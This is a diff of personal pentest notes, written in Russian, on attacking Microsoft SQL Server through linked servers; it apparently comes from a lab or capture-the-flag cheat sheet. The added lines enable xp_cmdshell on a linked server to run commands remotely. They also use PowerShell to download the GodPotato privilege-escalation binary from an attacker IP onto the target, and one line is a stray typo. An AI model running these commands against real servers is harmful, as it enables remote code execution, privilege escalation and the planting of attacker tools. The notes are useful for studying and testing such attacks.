@@ -162,7 +162,7 @@ export KRB5CCNAME=sqlsvc.ccache
 * узнать кто владелец базы данных
   
         SELECT d.name AS DatabaseName, SUSER_SNAME(d.owner_sid) AS DatabaseOwner, IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) AS IsOwnerSysadmin FROM sys.databases d WHERE d.name = 'prod';
-
+            enum_esers
 * создание процедуры повышения привелегий
 
       enum_users - кто есть владельцы бд и что за юзеры там
@@ -217,9 +217,15 @@ export KRB5CCNAME=sqlsvc.ccache
 
       SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
 * Если все ок то можно приступать к выполнению команд на удаленном сервере
-
+  
+        EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT DB02; --удаленное выполнение кода на другом сервере
+  
       EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT SQL02;
+* загрузка файлов на удаленный сервер
 
+       EXECUTE ('EXEC xp_cmdshell "powershell -Command Invoke-WebRequest -Uri ''http://10.10.15.142/GodPotato-NET4.exe'' -OutFile ''C:\users\public\gp.exe''";') AT DB02;
+
+  
 * Расшифровка паролей связанных серверов (после взлома)
 нужен локальный админ
 
